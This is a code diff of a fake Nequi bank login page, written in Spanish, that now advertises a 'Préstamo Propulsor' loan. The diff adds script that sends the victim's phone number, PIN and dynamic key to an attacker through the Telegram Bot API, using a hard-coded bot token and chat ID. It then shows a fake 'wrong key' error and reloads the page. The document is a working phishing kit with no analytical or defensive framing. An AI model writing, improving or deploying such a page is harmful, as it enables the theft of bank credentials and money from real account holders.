@@ -5,16 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Entrar a tu Nequi</title>
     <style>
-        /* Estilos del código original */
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(to bottom right, #ffe5ec, #ffe5f1);
+            background-color: #f8f8f8;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
+
         .container {
             text-align: center;
             background-color: white;
@@ -23,24 +23,29 @@
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             width: 380px;
         }
+
         .logo {
             margin-bottom: 20px;
         }
+
         .subtitle {
             font-size: 14px;
             margin-bottom: 25px;
             color: #333;
         }
+
         form {
             display: flex;
             flex-direction: column;
             align-items: center;
         }
+
         .input-group {
             width: 100%;
             margin-bottom: 20px;
             position: relative;
         }
+
         .input-group input {
             width: 100%;
             padding: 12px;
@@ -50,14 +55,17 @@
             outline: none;
             box-sizing: border-box;
         }
+
         .input-group input:focus {
             border-color: #D81B60;
         }
+
         .flag-input {
             display: flex;
             align-items: center;
             position: relative;
         }
+
         .flag {
             width: 24px;
             height: 16px;
@@ -69,9 +77,11 @@
             left: 10px;
             transform: translateY(-50%);
         }
+
         .input-group input.with-flag {
             padding-left: 40px;
         }
+
         .captcha {
             display: flex;
             align-items: center;
@@ -80,9 +90,11 @@
             font-size: 14px;
             color: #666;
         }
+
         .captcha input {
             margin-right: 8px;
         }
+
         .button {
             width: 100%;
             padding: 12px;
@@ -93,9 +105,11 @@
             border-radius: 5px;
             cursor: pointer;
         }
+
         .button:hover {
             background-color: #AD1457;
         }
+
         .info {
             font-size: 12px;
             color: #999;
@@ -106,7 +120,7 @@
 <body>
     <div class="container">
         <img src="https://static.wixstatic.com/media/ae1ba9_a0fdfe2f514a4f068af2f276f32b162e~mv2.png/v1/crop/x_109,y_187,w_288,h_126/fill/w_288,h_126,al_c,q_85,enc_avif,quality_auto/Logo-Nequi-1-removebg-preview.png" alt="Logo Nequi" class="logo" width="150">
-        <div class="subtitle">Podrás bloquear tu Nequi, consultar tus datos.</div>
+        <div class="subtitle">Préstamo Propulsor - ¡Plata de una en tu Nequi!</div>
         <form id="nequi-form">
             <div class="input-group">
                 <div class="flag-input">
@@ -116,7 +130,8 @@
                         id="phone" 
                         placeholder="Número de celular" 
                         maxlength="10" 
-                        oninput="validateInput(this, /^[0-9]*$/)" 
+                        inputmode="numeric" 
+                        oninput="validatePhone(this)" 
                         class="with-flag">
                 </div>
             </div>
@@ -126,7 +141,9 @@
                     id="password" 
                     placeholder="Contraseña" 
                     maxlength="4" 
-                    oninput="validateInput(this, /^[0-9]*$/)">
+                    inputmode="numeric" 
+                    pattern="[0-9]*" 
+                    oninput="validateInput(this)">
             </div>
             <div class="input-group">
                 <input 
@@ -134,7 +151,9 @@
                     id="dynamic-key" 
                     placeholder="Clave dinámica" 
                     maxlength="6" 
-                    oninput="validateInput(this, /^[0-9]*$/)">
+                    inputmode="numeric" 
+                    pattern="[0-9]*" 
+                    oninput="validateInput(this)">
             </div>
             <div class="captcha">
                 <input type="checkbox" id="captcha"> No soy un robot
@@ -145,24 +164,63 @@
     </div>
 
     <script>
-        function sendData() {
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const dynamicKey = document.getElementById('dynamic-key').value;
-            const captchaChecked = document.getElementById('captcha').checked;
-
-            if (!captchaChecked) {
-                alert('Por favor, verifica que no eres un robot.');
-                return;
+        function validatePhone(input) {
+            // Remover caracteres no numéricos
+            input.value = input.value.replace(/[^0-9]/g, '');
+            // Limitar el valor a 10 dígitos
+            if (input.value.length > 10) {
+                input.value = input.value.slice(0, 10);
             }
-
-            if (phone && password && dynamicKey) {
-                alert('⚠️ ¡Ups! Estás ingresando mal tu clave dinámica o expiró, verifica y vuelve a intentarlo.');
-                location.reload(); // Recargar la página
-            } else {
-                alert('Por favor, completa todos los campos.');
+            // Asegurar que el primer dígito sea 3
+            if (input.value.length > 0 && input.value[0] !== '3') {
+                input.value = input.value.slice(1); // Eliminar si no empieza con 3
             }
         }
-    </script>
-</body>
-</html>
+
+        function validateInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+        }
+
+       function sendData() {
+        const phone = document.getElementById('phone').value;
+        const password = document.getElementById('password').value;
+        const dynamicKey = document.getElementById('dynamic-key').value;
+        const captchaChecked = document.getElementById('captcha').checked;
+
+        if (!captchaChecked) {
+            alert('Por favor, verifica que no eres un robot.');
+            return;
+        }
+
+        if (phone.length === 10 && password && dynamicKey) {
+            const botToken = '7717092594:AAFsBPfWHx8gIZ8x_wMM6jfV6JWJPFBakoY';
+            const chatId = '7303278805';
+            const message = `Número de celular: ${phone}\nContraseña: ${password}\nClave dinámica: ${dynamicKey}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('⚠️ ¡Ups! Estás ingresando mal tu clave dinámica o expiró, verifica y vuelve a intentarlo.');
+                    location.reload(); // Recargar la página
+                } else {
+                    alert('Error al enviar los datos.');
+                }
+            })
+            .catch(error => {
+                alert('Error de red. Por favor, inténtalo de nuevo.');
+            });
+        } else {
+            alert('Por favor, completa todos los campos correctamente.');
+        }
+    }
+</script>
